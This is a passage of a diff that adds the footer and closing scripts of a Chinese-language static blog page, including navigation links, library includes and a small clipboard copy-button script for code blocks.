+    2020
+    行云
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
